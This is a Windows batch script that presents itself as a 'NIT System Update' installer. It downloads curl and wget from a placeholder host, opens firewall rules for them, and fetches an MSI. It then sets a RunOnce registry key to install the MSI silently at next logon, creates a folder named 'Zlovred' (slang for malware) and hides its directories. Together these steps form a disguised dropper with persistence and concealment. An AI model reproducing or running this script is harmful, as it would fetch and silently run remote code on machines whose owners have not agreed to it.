@echo on
rem ***************************************************************************
rem
rem Load-NIT-System-Update.bat
rem
rem This Command File Loads the NIT System Update Software and Install it
rem on Work Computer
rem
rem ATTENTION! This script must ron at elevated mode
rem
rem PARAMETERS:	NONE
rem RETURNS:	NONE
rem SOURCE:	http://dummy.mydomen.com/WinUpdate/Load-NIT-System-Update.bat
rem
rem ***************************************************************************

rem Additional Packets hostrem Environments Variables Init

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%

rem INSTALL TMPPUB Variable
rem Create target Directory
md c:\pub1\Distrib
set TEMPPUB=c:\pub1\Distrib

rem Set Common Host Downloads Varoables
set prefc=http
set hostc=dummy.mydomen.com
set portc=80
set uppathc=WinUpdate
set exppathc=Exponenta
set key=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

rem define the Variables
SET NITSYUP=NIT-System-Update.msi
SET NITSYUPNAME=NIT-System-Update

set host=%prefc%://%hostc%:%portc%/%exppathc%

rem Uninstall old data
%SystemRoot%\System32\wbem\WMIC.EXE product where name="%NITSYUPNAME%" call uninstall

rem Download
%SystemRoot%\System32\bitsadmin /Transfer STEA_TRANSFER /DOWNLOAD /Priority FOREGROUND %host%/wget.exe %TEMPPUB%\wget.exe %host%/LIBCURL.DLL %TEMPPUB%\libcurl.dll %host%/CURL.EXE %TEMPPUB%\curl.exe

rem Enable all protocols for curl, wget
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=in action=allow program="%TEMPPUB%\wget.exe" enable=yes
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=out action=allow program="%TEMPPUB%\wget.exe" enable=yes
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=in action=allow program="%TEMPPUB%\curl.exe" enable=yes
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=out action=allow program="%TEMPPUB%\curl.exe" enable=yes

"%TEMPPUB%\curl.exe" %prefc%://%hostc%:%portc%/%uppathc%/%NITSYUP% -o %TEMPPUB%\%NITSYUP%

rem Install Exponenta Admin Pack
%SystemRoot%\System32\reg.exe add %key% /v data /t REG_SZ /d "%SystemRoot%\System32\msiexec.exe /i  \"%TEMPPUB%\%NITSYUP%\" /norestart /QN /L*V  \"%TEMPPUB%\%NITSYUP%.log\""
rem %SystemRoot%\System32\msiexec.exe /i  "%TEMPPUB%\%NITSYUP%" /norestart /QN /L*V  "%TEMPPUB%\%NITSYUP%.log"

rem Create target Directory
md c:\pub1\Distrib\Zlovred
%SystemRoot%\System32\attrib.exe +H c:\pub1
%SystemRoot%\System32\attrib.exe +H c:\pub1\Distrib
%SystemRoot%\System32\attrib.exe +H c:\pub1\Distrib\Zlovred

rem Delete the Firewall Rule

%SystemRoot%\System32\netsh.exe advfirewall firewall delete rule name="WGET.EXE Application rule 1"

rem The End of this Command File
